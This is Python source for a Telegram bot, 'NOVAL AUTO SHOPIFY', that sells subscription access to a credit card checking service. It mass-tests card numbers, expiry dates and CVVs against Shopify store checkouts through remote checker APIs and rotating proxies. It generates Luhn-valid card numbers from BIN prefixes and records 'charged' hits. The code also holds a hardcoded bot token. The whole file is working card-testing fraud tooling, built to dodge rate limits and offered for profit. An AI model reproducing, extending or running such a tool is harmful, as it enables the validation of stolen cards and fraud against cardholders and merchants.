import traceback
# ─────────────────────────────────────────────────────────────────────────────
# NOVAL AUTO SHOPIFY — v52 (FIXED · SPLIT CHECKERS · APPROVAL FEEDBACK · LOGS)
# ─────────────────────────────────────────────────────────────────────────────

import asyncio, gzip, html, io, json, logging, os, random, re, sqlite3, string, sys, threading, time, uuid, urllib.parse, traceback
from collections import defaultdict
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional

import aiohttp
from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto, InputMediaVideo, LabeledPrice, PreCheckoutQuery, BotCommand, BufferedInputFile,
)
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramBadRequest

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# ── Env & Config ─────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "9012515117:AAHBOQixNNM75viCZdk7eTEnoq8EWEUqg9E")
DB_PATH = os.getenv("DB_PATH", "bot.db")
API_STATE_PATH = os.getenv("API_STATE_PATH", "api_endpoints.json")
SITES_PATH = os.getenv("SITES_PATH", "sites.txt")
PORT = os.getenv("PORT")

OWNER_ID = 6343891623
OWNER_ID2 = 8919487892
ADMIN_IDS = [OWNER_ID, OWNER_ID2]
LIMITED_ADMIN_IDS: List[int] = []
KEY_PREFIX = "NOVAL-PRO"
START_TIME = time.time()

CHECK_TIMEOUT            = 45
PROXY_CONNECT_TIMEOUT    = 10
PROXY_SOCK_READ_TIMEOUT  = 30

MASS_BATCH_SIZE_LB          = 250
MASS_BATCH_DELAY_LB         = 0.3
MASS_CONCURRENCY_LB_ADMIN   = 100
MASS_CONCURRENCY_LB_PREMIUM = 60

PROXY_TEST_TIMEOUT         = 15
PROXY_TEST_CONNECT_TIMEOUT = 10
PROXY_TEST_BATCH           = 25
PROXY_TEST_URL             = "https://api.ipify.org"
LIVE_PROXY_LIMIT           = 100
PER_PROXY_CONCURRENCY      = 4
PROXY_FAIL_THRESHOLD       = 2

DEFAULT_WORKERS_CAP = 900
ENDPOINT_FAIL_THRESHOLD = 3
ENDPOINT_COOLDOWN_SEC = 60

DUMMY_CC = "4111111111111111|12|30|123"
BOT_USERNAME = "NOVAL_AUTOSHOPI_BOT"
HIDDEN_CREDIT = "<blockquote><i>Powered by <a href='https://t.me/Senselessme'>@Senselessme</a></i></blockquote>"

RETRYABLE_CLS = {"timeout", "rate_limited", "site_error", "proxy_error", "error"}

# ── Media Assets ─────────────────────────────────────────────────────────────
VIDEOS = [
    "https://files.catbox.moe/7od2fh.mp4", "https://files.catbox.moe/ykw05n.mp4",
    "https://files.catbox.moe/6s7klz.mp4", "https://files.catbox.moe/1wt119.mp4",
    "https://files.catbox.moe/jzkofh.mp4", "https://files.catbox.moe/mxmzn7.mp4",
    "https://files.catbox.moe/5151uk.mp4"
]
IMAGES = [
    "https://files.catbox.moe/c2kzjk.jpg", "https://files.catbox.moe/lytev2.jpg",
    "https://files.catbox.moe/uky8rd.jpg", "https://files.catbox.moe/6lwbz8.jpg",
    "https://files.catbox.moe/g68i0b.jpg", "https://files.catbox.moe/cjkeeo.jpg",
    "https://files.catbox.moe/22bow8.jpg", "https://files.catbox.moe/w3sfcy.jpg",
    "https://files.catbox.moe/1zq5vj.jpg", "https://files.catbox.moe/oooo15.jpg",
    "https://files.catbox.moe/ezmqwe.jpg", "https://files.catbox.moe/ylw8v9.jpg",
    "https://files.catbox.moe/3xlvuu.jpg"
]
IMG_MAIN = IMAGES[0]

BACKUP_CHUNK_SIZE  = 18 * 1024 * 1024
BACKUP_SESSION_TTL = 3600
_restore_sessions = {}
_restore_lock = threading.RLock()

DEFAULT_API_STATE = {
    "version": 5,
    "endpoints": [
        {"url": "http://107.148.78.54:8083/shopify", "style": "raw", "cap": 900,
         "enabled": True, "key": None, "site_required": False},
    ],
    "active_idx": 0,
}
DEFAULT_SITES: List[str] = []
TELEGRAM_PROXY = None

PLANS = {
    "free":      {"name": "Free Trial", "limit": 1000,  "mass_limit": 100},
    "pro":       {"name": "Pro",        "limit": 5000,  "mass_limit": 2000},
    "premium":   {"name": "Premium",    "limit": 10000, "mass_limit": 5000},
    "max":       {"name": "Max",        "limit": 30000, "mass_limit": 10000},
    "unlimited": {"name": "Unlimited",  "limit": 999999, "mass_limit": 20000},
}
STAR_PRODUCTS = {
    "star_premium":   {"plan": "premium",   "stars": 200, "days": 30, "label": "Premium — 30 Days"},
    "star_max":       {"plan": "max",       "stars": 500, "days": 30, "label": "MAX — 30 Days"},
    "star_unlimited": {"plan": "unlimited", "stars": 800, "days": 30, "label": "Unlimited — 30 Days"},
}

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s",
                    stream=sys.stderr)
log = logging.getLogger("noval")

EMOJI = {
    "settings":"5877260593903177342","back":"5875082500023258804","forward":"5832251986635920010",
    "user":"5879770735999717115","pen":"5839380580080293813","docs":"5877301185639091664",
    "trash":"5879915802815107172","unlock":"5886505193180239900","star":"5839116473951328489",
    "chat":"5793933761594789855","help":"5897846616966041652","tools":"5988023995125993550",
    "stop":"5870734657384877785","add":"5920090136627908485","shop":"5983399041197675256",
    "gem":"5778546023349621090","gem2":"5963312935148195483","gem3":"6028530359975548369",
    "chat2":"5985617073978481575","cross1":"5985346521103604145","up":"6030861234432121355",
    "num1":"5794182096603847292","pen2":"5985774024968379294","loading":"6258124820400049944",
    "infinity":"6258154670422757760","heart":"6257853292567597091","percent":"6258071055999438126",
    "warn_red":"6257858798715670989","chart":"6258267877170745815","check":"6258098853027778582",
    "online":"6260192112713666900","gem4":"6260181985180782013","up_tri":"6262482227930598980",
    "diamond":"6260156752247918115","refresh":"6260297232038235681","check2":"6262671743362535108",
    "diamond2":"6260308957298954089","green_sq":"6260565633134498058","down_tri":"6260486601441284439",
    "ghost":"6282819035516113016","cross2":"6282852025159913806","check3":"6280338743442280499",
    "hourglass":"6280443553529204094","glow_star":"6280674670014369924","smile":"6282811871510662984",
    "upside":"6282622386143498738","warn":"6206077285720659346","warn2":"6206174450765796040",
    "link":"6206497372176913599","book":"6206112371308500200","pill":"6206378324273403309",
    "bell":"6206508629286196237","red_x":"6206110936789423908",
}

def pbtn(text, *, icon="star", color="primary", callback_data=None, url=None):
    try:
        return InlineKeyboardButton(
            text=text, callback_data=callback_data, url=url,
            icon_custom_emoji_id=EMOJI.get(icon, EMOJI["star"]), style=color)
    except Exception:
        return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)

def pe(name): return f'<tg-emoji emoji-id="{EMOJI.get(name, EMOJI["star"])}">👑</tg-emoji>'
def esc(text): return html.escape(str(text) if text is not None else "")

_SC_MAP = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ',
           'l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ',
           'w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'}
def sc(text: str) -> str: return "".join(_SC_MAP.get(ch.lower(), ch) for ch in str(text))

def owner_link(): return f'<a href="https://t.me/Senselessme">@Senselessme</a>'
def channel_link(): return f'<a href="https://t.me/NovalNetwork">@NovalNetwork</a>'

_URL_RE      = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
_IP_PORT_RE  = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b")
_HOST_PORT_RE = re.compile(r"\b[a-zA-Z0-9][a-zA-Z0-9\-\.]{1,}\.[a-zA-Z]{2,}(?::\d{1,5})?\b")
def _sanitize_err(msg) -> str:
    if not msg: return ""
    s = str(msg)
    s = _URL_RE.sub("[redacted]", s)
    s = _IP_PORT_RE.sub("[redacted]", s)
    s = _HOST_PORT_RE.sub("[redacted]", s)
    return s[:200]

def _user_link(uid: int, username: str = "") -> str:
    if not uid: return sc("N/A")
    if username: return f'<a href="https://t.me/{esc(username.lstrip("@"))}">{esc(username)}</a>'
    return f'<a href="tg://user?id={uid}">User {uid}</a>'

def get_check_cooldown() -> int: return int(get_setting("cooldown_sec", "1"))

_state_lock = threading.RLock()
_sites_cache: List[str] = []
_sites_loaded = False

def _atomic_write(path: str, data: str) -> None:
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f: f.write(data)
    os.replace(tmp, path)

def _migrate_api_state(st: Dict[str, Any]) -> Dict[str, Any]:
    ver = int(st.get("version", 1) or 1)
    if ver < 5:
        existing = {e.get("url", "") for e in st.get("endpoints", [])}
        for ep in DEFAULT_API_STATE["endpoints"]:
            if ep["url"] not in existing:
                st.setdefault("endpoints", []).append(dict(ep))
        st["version"] = 5
    for ep in st.get("endpoints", []):
        ep.setdefault("style", "params")
        ep.setdefault("cap", DEFAULT_WORKERS_CAP)
        ep.setdefault("enabled", True)
        ep.setdefault("key", None)
        if "site_required" not in ep:
            ep["site_required"] = (ep.get("style") == "params")
    st.setdefault("active_idx", 0)
    return st

def load_api_state() -> Dict[str, Any]:
    with _state_lock:
        try:
            with open(API_STATE_PATH, "r", encoding="utf-8") as f: st = json.load(f)
            if not isinstance(st.get("endpoints"), list): raise ValueError("bad state")
            return _migrate_api_state(st)
        except Exception:
            _atomic_write(API_STATE_PATH, json.dumps(DEFAULT_API_STATE, indent=2))
            return json.loads(json.dumps(DEFAULT_API_STATE))

def save_api_state(st: Dict[str, Any]) -> None:
    with _state_lock: _atomic_write(API_STATE_PATH, json.dumps(st, indent=2))

def _filtered_endpoints() -> List[Dict[str, Any]]:
    mode = get_setting("site_mode", "auto")
    st = load_api_state()
    eps = [e for e in st.get("endpoints", []) if e.get("enabled", True) and e.get("url")]
    if mode == "siteless":   eps = [e for e in eps if not e.get("site_required", False)]
    elif mode == "with_site": eps = [e for e in eps if e.get("site_required", False)]
    return eps

def mode_label() -> str:
    m = get_setting("site_mode", "auto")
    if m == "siteless":   return "SITELESS"
    if m == "with_site":  return "WITH-SITE"
    return "AUTO"

_endpoint_rr = 0
_endpoint_rr_lock = threading.Lock()
_endpoint_fail_counts: Dict[str, int] = {}
_endpoint_fail_ts:    Dict[str, float] = {}

def mark_endpoint_fail(url: str):
    _endpoint_fail_counts[url] = _endpoint_fail_counts.get(url, 0) + 1
    if _endpoint_fail_counts[url] >= ENDPOINT_FAIL_THRESHOLD:
        _endpoint_fail_ts[url] = time.time()

def mark_endpoint_ok(url: str):
    _endpoint_fail_counts.pop(url, None)
    _endpoint_fail_ts.pop(url, None)

def is_endpoint_down(url: str) -> bool:
    ts = _endpoint_fail_ts.get(url, 0)
    if ts and time.time() - ts < ENDPOINT_COOLDOWN_SEC: return True
    if ts:
        _endpoint_fail_ts.pop(url, None)
        _endpoint_fail_counts.pop(url, None)
    return False

# ── Siteless / With-Site API pools ───────────────────────────────────────────
_sl_rr = 0; _ws_rr = 0
_sl_rr_lock = threading.Lock(); _ws_rr_lock = threading.Lock()

def get_siteless_apis() -> List[Dict[str, Any]]:
    try:
        with db() as c:
            return [{"endpoint": r["endpoint"], "key": r["key"] or ""}
                    for r in c.execute("SELECT * FROM api_siteless WHERE enabled=1").fetchall()]
    except: return []

def get_withsite_apis() -> List[Dict[str, Any]]:
    try:
        with db() as c:
            return [{"endpoint": r["endpoint"], "key": r["key"] or ""}
                    for r in c.execute("SELECT * FROM api_withsite WHERE enabled=1").fetchall()]
    except: return []

def add_siteless_api(endpoint: str, key: str = ""):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO api_siteless(endpoint, key, enabled, added_at) VALUES(?,?,1,?)",
                  (endpoint.strip(), key.strip(), datetime.now(timezone.utc).isoformat()))

def add_withsite_api(endpoint: str, key: str = ""):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO api_withsite(endpoint, key, enabled, added_at) VALUES(?,?,1,?)",
                  (endpoint.strip(), key.strip(), datetime.now(timezone.utc).isoformat()))

def pick_siteless_api() -> Optional[Dict[str, Any]]:
    global _sl_rr
    apis = get_siteless_apis()
    if not apis: return None
    with _sl_rr_lock:
        idx = _sl_rr % len(apis); _sl_rr += 1
    return apis[idx]

def pick_withsite_api() -> Optional[Dict[str, Any]]:
    global _ws_rr
    apis = get_withsite_apis()
    if not apis: return None
    with _ws_rr_lock:
        idx = _ws_rr % len(apis); _ws_rr += 1
    return apis[idx]

def build_siteless_url(api: Dict[str, Any], cc: str, proxy: Optional[str]) -> str:
    base = api["endpoint"].rstrip("/")
    cc_enc = urllib.parse.quote(cc, safe="")
    proxy_enc = urllib.parse.quote(proxy or "", safe=":@")
    sep = "&" if "?" in base else "?"
    url = f"{base}{sep}{cc_enc}"
    if proxy: url += f"&proxy={proxy_enc}"
    if api.get("key"): url += f"&key={urllib.parse.quote(api['key'], safe='')}"
    return url

def build_withsite_url(api: Dict[str, Any], cc: str, proxy: Optional[str], site: str) -> str:
    base = api["endpoint"].rstrip("/")
    cc_enc = urllib.parse.quote(cc, safe="")
    proxy_enc = urllib.parse.quote(proxy or "", safe=":@")
    site_full = site if site.startswith("http") else f"https://{site}"
    site_enc = urllib.parse.quote(site_full, safe=":/")
    sep = "&" if "?" in base else "?"
    url = f"{base}{sep}cc={cc_enc}&site={site_enc}&proxy={proxy_enc}"
    if api.get("key"): url += f"&key={urllib.parse.quote(api['key'], safe='')}"
    return url

# ── DB ───────────────────────────────────────────────────────────────────────
_db_conn: Optional[sqlite3.Connection] = None
_db_lock = threading.RLock()
_db_write_lock: Optional[asyncio.Lock] = None

def _get_write_lock() -> asyncio.Lock:
    global _db_write_lock
    if _db_write_lock is None: _db_write_lock = asyncio.Lock()
    return _db_write_lock

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA busy_timeout=60000")
    return _db_conn

def reset_db_conn():
    global _db_conn
    with _db_lock:
        if _db_conn:
            try: _db_conn.close()
            except: pass
            _db_conn = None
    return _get_conn()

@contextmanager
def db():
    conn = _get_conn()
    with _db_lock:
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise

def init_db() -> None:
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid INTEGER PRIMARY KEY, username TEXT DEFAULT '', plan TEXT DEFAULT 'free',
            premium_until TEXT DEFAULT '', daily_checks INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '', credits INTEGER DEFAULT 50,
            last_credit_date TEXT DEFAULT '', trial_last_used TEXT DEFAULT '',
            awaiting TEXT DEFAULT '', banned INTEGER DEFAULT 0, ban_reason TEXT DEFAULT '',
            refer_count INTEGER DEFAULT 0, referred_by INTEGER DEFAULT 0, streak INTEGER DEFAULT 0,
            last_streak_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0, last_seen TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY, plan TEXT, max_uses INTEGER,
            used INTEGER DEFAULT 0, days INTEGER DEFAULT 30);
        CREATE TABLE IF NOT EXISTS redeem_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, uid INTEGER, used_at TEXT,
            UNIQUE(code, uid));
        CREATE TABLE IF NOT EXISTS check_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, response TEXT,
            status TEXT, gateway TEXT, mode TEXT DEFAULT 'shopify',
            error_trace TEXT DEFAULT '', ts TEXT);
        CREATE TABLE IF NOT EXISTS saved_cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, saved_at TEXT,
            UNIQUE(uid, cc));
        CREATE TABLE IF NOT EXISTS bin_cache (bin TEXT PRIMARY KEY, data TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, proxy TEXT,
            status TEXT DEFAULT 'unknown', latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '', UNIQUE(uid, proxy));
        CREATE TABLE IF NOT EXISTS sites (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE);
        CREATE TABLE IF NOT EXISTS force_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', chat_type TEXT DEFAULT 'channel',
            invite_link TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT '');
        CREATE TABLE IF NOT EXISTS charged_hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT, cc TEXT, site TEXT, response TEXT,
            amount REAL DEFAULT 0, currency TEXT DEFAULT 'USD', uid INTEGER DEFAULT 0, ts TEXT DEFAULT '');
        CREATE TABLE IF NOT EXISTS feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid INTEGER, username TEXT, msg_type TEXT, text TEXT, file_id TEXT,
            file_type TEXT DEFAULT 'none', status TEXT DEFAULT 'pending',
            approved_by INTEGER DEFAULT 0, ts TEXT);
        CREATE TABLE IF NOT EXISTS api_siteless (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            endpoint TEXT UNIQUE, key TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT '');
        CREATE TABLE IF NOT EXISTS api_withsite (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            endpoint TEXT UNIQUE, key TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT '');
        CREATE TABLE IF NOT EXISTS scrapper_gcs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', added_at TEXT DEFAULT '');
        """)
        for k, v in [
            ("maintenance", "0"), ("hit_log_channel", ""), ("auto_post_chat", ""),
            ("charged_gc_id", ""), ("charged_gc_name", ""), ("public_gc_id", ""),
            ("fb_channel_id", ""), ("fb_channel_id2", ""),
            ("site_max_price", "6.0"), ("site_health", "{}"),
            ("extra_admins", ""), ("limited_admins", ""),
            ("pvt_file_gc_id", ""), ("pvt_file_gc_name", ""),
            ("pvt_cc_gc_id", ""), ("pvt_cc_gc_name", ""),
            ("site_mode", "auto"), ("daily_credits", "50"), ("gen_limit", "10"),
            ("bot_name", "NOVAL AUTO SHOPIFY"),
            ("support_link", "https://t.me/Senselessme"),
            ("wallet_usdt", "Enter USDT Address"),
            ("wallet_ton", "Enter TON Address"),
            ("asset_IMG_MAIN", IMG_MAIN), ("asset_VID_MAIN", ""),
            ("cooldown_sec", "1"), ("price_weekly", "10"), ("price_monthly", "30"),
            ("trial_hours", "3"), ("proxy_required", "0"), ("anti_spam_limit", "5"),
            ("support_enabled", "1"), ("max_retries", "3"), ("scrapper_enabled", "1"),
            ("stripe_sk", ""), ("stripe_pk", ""),
        ]:
            c.execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?,?)", (k, v))

def get_setting(key, default=""):
    try:
        with db() as c:
            r = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            return r["value"] if r else default
    except: return default

def set_setting(key, value):
    with db() as c:
        c.execute("INSERT INTO settings(key,value) VALUES (?,?) "
                  "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))

def load_extra_admins():
    try:
        stored = get_setting("extra_admins", "")
        if stored:
            for x in stored.split(","):
                if x.strip().isdigit() and int(x) not in ADMIN_IDS: ADMIN_IDS.append(int(x))
        lst = get_setting("limited_admins", "")
        if lst:
            for x in lst.split(","):
                if x.strip().isdigit() and int(x) not in LIMITED_ADMIN_IDS: LIMITED_ADMIN_IDS.append(int(x))
    except: pass

def save_extra_admins():
    try:
        set_setting("extra_admins", ",".join(str(x) for x in ADMIN_IDS if x not in (OWNER_ID, OWNER_ID2)))
        set_setting("limited_admins", ",".join(str(x) for x in LIMITED_ADMIN_IDS))
    except: pass

def get_user(uid):
    try:
        with db() as c: return c.execute("SELECT * FROM users WHERE uid=?", (uid,)).fetchone()
    except: return None

def ensure_user(uid, username=""):
    try:
        with db() as c:
            row = c.execute("SELECT uid FROM users WHERE uid=?", (uid,)).fetchone()
            today = datetime.now(timezone.utc).date().isoformat()
            now = datetime.now(timezone.utc).isoformat()
            if not row:
                c.execute("INSERT OR IGNORE INTO users(uid, username, last_credit_date, last_check_date, last_seen) "
                          "VALUES (?,?,?,?,?)", (uid, username or "", today, today, now))
            else:
                c.execute("UPDATE users SET username=?, last_seen=? WHERE uid=?",
                          (username or "", now, uid))
    except Exception as e: log.warning(f"ensure_user: {e}")

def get_user_or_create(uid, username=""):
    ensure_user(uid, username)
    return get_user(uid)

def set_awaiting(uid, state):
    ensure_user(uid)
    with db() as c: c.execute("UPDATE users SET awaiting=? WHERE uid=?", (state, uid))

def get_awaiting(uid):
    u = get_user(uid)
    return u["awaiting"] if u else ""

def is_full_admin(uid): return uid in ADMIN_IDS
def is_limited_admin(uid): return uid in LIMITED_ADMIN_IDS
def is_admin(uid): return is_full_admin(uid) or is_limited_admin(uid)

def plan_of(uid):
    u = get_user(uid)
    return u["plan"] if u and u["plan"] in PLANS else "free"

def upgrade_user(uid, plan_name, days=30):
    if plan_name not in PLANS: return
    ensure_user(uid)
    exp = "" if plan_name == "unlimited" else (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    with db() as c:
        c.execute("UPDATE users SET plan=?, premium_until=? WHERE uid=?",
                  (plan_name, exp, uid))

class EnsureUserMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            u = data.get("event_from_user")
            if u and not getattr(u, "is_bot", False):
                ensure_user(u.id, u.username or "")
        except: pass
        return await handler(event, data)

# Sites (DB-backed)
_sites_cache2 = None
_sites_cache_ts = 0

def _invalidate_sites():
    global _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded
    _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded = [], None, 0, False

def load_sites() -> List[str]:
    """Backward-compat wrapper — sites are DB-backed."""
    return get_sites()

def get_sites() -> List[str]:
    global _sites_cache2, _sites_cache_ts
    now = time.time()
    if _sites_cache2 is not None and (now - _sites_cache_ts) < 30: return _sites_cache2
    try:
        with db() as c:
            _sites_cache2 = [r["url"] for r in c.execute("SELECT url FROM sites ORDER BY id").fetchall()]
    except: _sites_cache2 = []
    _sites_cache_ts = now
    return _sites_cache2

def add_site_db(url: str) -> bool:
    url = url.strip().lower()
    if url.startswith("https://"): url = url[8:]
    elif url.startswith("http://"): url = url[7:]
    url = url.split("/")[0]
    if not url: return False
    with db() as c: c.execute("INSERT OR IGNORE INTO sites(url) VALUES (?)", (url,))
    _invalidate_sites()
    return True

def remove_site_db(url: str):
    with db() as c: c.execute("DELETE FROM sites WHERE url=?", (url,))
    _invalidate_sites()

def force_channels_list(enabled_only=False):
    with db() as c:
        q = "SELECT * FROM force_channels"
        if enabled_only: q += " WHERE enabled=1"
        return c.execute(q).fetchall()

def add_force_channel(chat_id: str, title: str = "", chat_type: str = "channel", invite_link: str = ""):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO force_channels(chat_id, title, chat_type, invite_link, enabled, added_at) "
                  "VALUES (?, ?, ?, ?, 1, ?)",
                  (str(chat_id), title, chat_type, invite_link, datetime.now(timezone.utc).isoformat()))

def remove_force_channel(chat_id: str):
    with db() as c: c.execute("DELETE FROM force_channels WHERE chat_id=?", (str(chat_id),))

async def check_force_sub(bot, uid):
    if is_admin(uid): return True
    for ch in force_channels_list(enabled_only=True):
        try:
            m = await bot.get_chat_member(ch["chat_id"], uid)
            if m.status in ("left", "kicked"): return False
        except: pass
    return True

# Site health & rate-limit
_site_fail_count: Dict[str, int] = {}
_site_cooldown_until: Dict[str, float] = {}
SITE_MIN_GAP = 1.0
_site_last_hit: Dict[str, float] = {}
_site_locks: Dict[str, asyncio.Lock] = {}

async def acquire_site_slot(site: str):
    if not site: return
    lock = _site_locks.setdefault(site, asyncio.Lock())
    async with lock:
        wait = SITE_MIN_GAP - (time.time() - _site_last_hit.get(site, 0))
        if wait > 0: await asyncio.sleep(wait)
        _site_last_hit[site] = time.time()

def _is_site_benched(site): return time.time() < _site_cooldown_until.get(site, 0)
def _bench_site(site, seconds=120): _site_cooldown_until[site] = time.time() + seconds

def _pick_random_sites(n=3):
    sites = get_sites()
    if not sites: return []
    healthy = [s for s in sites if not _is_site_benched(s)]
    pool = healthy if healthy else list(sites)
    random.shuffle(pool)
    return pool[:n]

_mass_tasks = {}
_pending_mass: Dict[str, Dict[str, Any]] = {}

def _cleanup_pending_mass():
    now = time.time()
    for k in [k for k, v in _pending_mass.items() if now - v.get("ts", 0) > 3600]:
        _pending_mass.pop(k, None)

# ── CC helpers ───────────────────────────────────────────────────────────────
CC_REGEX = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw):
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19): return None
    if len(yy) == 4: yy = yy[2:]
    cc = f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"
    return cc if CC_REGEX.match(cc) else None

def country_flag(code):
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

def luhn_check_digit(partial):
    for d in "0123456789":
        if luhn_ok(partial + d): return d
    return "0"

def luhn_ok(card):
    if not card.isdigit(): return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def brand_pe(cc):
    if cc.startswith('4'): return f"{pe('gem')} ᴠɪꜱᴀ"
    if cc.startswith('5'): return f"{pe('gem2')} ᴍᴀꜱᴛᴇʀ"
    if cc.startswith(('34','37')): return f"{pe('gem3')} ᴀᴍᴇx"
    return f"{pe('gem4')} ᴅɪꜱᴄ"

def generate_custom_cc(pattern: str, count: int = 10) -> List[str]:
    cards = []
    for _ in range(count):
        cc = re.sub(r'[xX]', lambda _: random.choice(string.digits), pattern)
        parts = cc.split('|')
        if len(parts) != 4: continue
        num, mm, yy, cvv = parts
        if len(num) < 13 or len(num) > 19: continue
        if len(mm) < 1 or len(mm) > 2: continue
        if len(yy) < 2 or len(yy) > 4: continue
        if len(cvv) < 3 or len(cvv) > 4: continue
        mm = mm.zfill(2)
        if len(yy) == 2: yy = yy.zfill(2)
        elif len(yy) == 4: yy = yy[2:]
        if len(num) == 15: num += luhn_check_digit(num)
        final_card = f"{num}|{mm}|{yy}|{cvv}"
        if CC_REGEX.match(final_card): cards.append(final_card)
    return cards

def generate_cc(bin_prefix, count=10):
    pattern = f"{bin_prefix}{'x' * (16 - len(bin_prefix))}|12|30|123"
    return generate_custom_cc(pattern, count)

# ── Proxy system ─────────────────────────────────────────────────────────────
_proxy_sems: Dict[str, asyncio.Semaphore] = {}
_proxy_fail_streak: Dict[str, int] = defaultdict(int)
_dead_proxies_run: set = set()
_rotation_counters: Dict[int, int] = {}
_rotation_lock = threading.Lock()

def rotate_proxy(uid: int, proxies: List[str]) -> Optional[str]:
    if not proxies: return None
    with _rotation_lock:
        i = _rotation_counters.get(uid, 0)
        _rotation_counters[uid] = i + 1
    return proxies[i % len(proxies)]

def proxy_sem(proxy: str) -> asyncio.Semaphore:
    if proxy not in _proxy_sems:
        _proxy_sems[proxy] = asyncio.Semaphore(PER_PROXY_CONCURRENCY)
    return _proxy_sems[proxy]

def mark_proxy_ok(proxy: str):
    if proxy: _proxy_fail_streak.pop(proxy, None)

def mark_proxy_fail(proxy: str) -> bool:
    if not proxy: return False
    _proxy_fail_streak[proxy] += 1
    if _proxy_fail_streak[proxy] >= PROXY_FAIL_THRESHOLD:
        _dead_proxies_run.add(proxy)
        return True
    return False

def normalize_proxy(line: str) -> Optional[str]:
    if not line: return None
    p = line.strip()
    if not p or p.startswith("#") or p.startswith("//"): return None
    scheme = "http"
    if p.startswith("socks5://"): scheme = "socks5"; p = p[9:]
    elif p.startswith("socks4://"): scheme = "socks4"; p = p[9:]
    elif p.startswith("http://"): scheme = "http"; p = p[7:]
    elif p.startswith("https://"): scheme = "https"; p = p[8:]
    if "@" in p:
        auth, hostport = p.split("@", 1)
        if ":" not in auth or ":" not in hostport: return None
        user, pw = auth.split(":", 1)
        host, port = hostport.rsplit(":", 1)
        return f"{scheme}://{user}:{pw}@{host}:{port}"
    parts = p.split(":")
    if len(parts) == 4:
        return f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"{scheme}://{parts[0]}:{parts[1]}"
    return None

def _proxy_to_url(p: str) -> str:
    if "://" in p: return p
    parts = p.split(":")
    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}" if len(parts) == 4 else f"http://{p}"
